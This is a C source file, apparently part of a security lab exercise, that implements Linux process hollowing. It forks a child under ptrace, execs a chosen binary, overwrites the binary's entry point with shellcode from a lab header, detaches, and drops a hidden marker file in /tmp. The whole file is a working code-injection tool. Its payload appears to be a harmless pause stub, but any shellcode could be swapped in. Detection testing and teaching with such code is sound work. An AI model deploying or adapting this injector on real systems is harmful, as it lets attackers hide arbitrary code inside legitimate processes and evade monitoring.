#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include "lab_common.h"

int inject_hollowing(const char *target_binary) {
    pid_t child;
    int status;
    struct user_regs_struct regs;
    int slen = shell_pause_len;

    printf("[*] Process Hollowing - Target: %s\n", target_binary);

    child = fork();
    if (child == -1) {
        perror("[-] fork failed");
        return -1;
    }

    if (child == 0) {
        ptrace(PTRACE_TRACEME, 0, NULL, NULL);
        raise(SIGSTOP);
        execve(target_binary, (char *[]){ (char *)target_binary, NULL }, NULL);
        perror("[-] execve in child failed");
        _exit(1);
    }

    waitpid(child, &status, 0);
    printf("[+] Child stopped, PID: %d\n", child);

    ptrace(PTRACE_CONT, child, NULL, NULL);
    waitpid(child, &status, 0);

    if (!WIFSTOPPED(status)) {
        printf("[-] Child didn't stop after exec\n");
        return -1;
    }

    ptrace(PTRACE_GETREGS, child, NULL, &regs);
    printf("[+] Child RIP (entry point): 0x%llx\n", regs.rip);

    for (int i = 0; i < slen; i += sizeof(long)) {
        unsigned long data = 0;
        memcpy(&data, shell_pause + i,
                (slen - i < (int)sizeof(long)) ? (slen - i) : (int)sizeof(long));
        ptrace(PTRACE_POKETEXT, child, regs.rip + i, data);
    }
    printf("[+] Shellcode written to entry point\n");

    ptrace(PTRACE_DETACH, child, NULL, NULL);

    /* Save PID for cleanup */
    FILE *pf = fopen("/tmp/process_hollow.pid", "w");
    if (pf) { fprintf(pf, "%d", child); fclose(pf); }

     set_flag("/tmp/.hollowing_active");
     return 0;
 }

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <binary>\n", argv[0]);
        return 1;
    }
    return inject_hollowing(argv[1]);
}
